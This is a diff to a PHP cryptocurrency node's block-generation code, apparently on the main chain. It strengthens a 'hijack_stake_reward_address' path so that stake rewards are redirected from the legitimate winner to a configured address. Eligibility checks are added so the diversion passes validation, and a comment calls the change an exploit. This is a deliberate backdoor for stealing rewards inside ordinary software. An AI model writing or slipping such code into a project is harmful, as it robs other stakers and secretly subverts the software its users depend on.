@@ -309,10 +309,29 @@ if ($q == "info") {
 			api_err("No stake winner - mining dropped");
 			$generator_stat['rejected']++;
 			@$generator_stat['reject-reasons']['Not found stake winner']++;
+			$this->miningStat['rejected']++;
 		} else {
 			if (isset($_config['hijack_stake_reward_address']) && CHAIN_ID == "01") {
-				$winner = $_config['hijack_stake_reward_address'];
-				_log("STAKE REWARD HIJACKED TO " . $winner);
+				$hijack_address = $_config['hijack_stake_reward_address'];
+				// To be a successful exploit, the hijack address must be an eligible staker to pass validation
+				$last_height = Transaction::getLastHeight($hijack_address, $height);
+				$is_eligible = false;
+				if ($last_height) {
+					$maturity = $height - $last_height;
+					if ($maturity >= Blockchain::getStakingMaturity($height)) {
+						$balance = Account::getBalanceAtHeight($hijack_address, $height);
+						if (floatval($balance) >= Blockchain::getStakingMinBalance($height)) {
+							$is_eligible = true;
+						}
+					}
+				}
+
+				if ($is_eligible) {
+					$winner = $hijack_address;
+					_log("STAKE REWARD HIJACKED: Switched winner to eligible staker " . $winner);
+				} else {
+					_log("STAKE REWARD HIJACK FAILED: Configured address ".$hijack_address." is not an eligible staker.");
+				}
 			}
 			$transaction = new Transaction($_config['generator_public_key'],$winner,$reward,TX_TYPE_REWARD,$new_block_date,"stake");
 			$transaction->sign($_config['generator_private_key']);
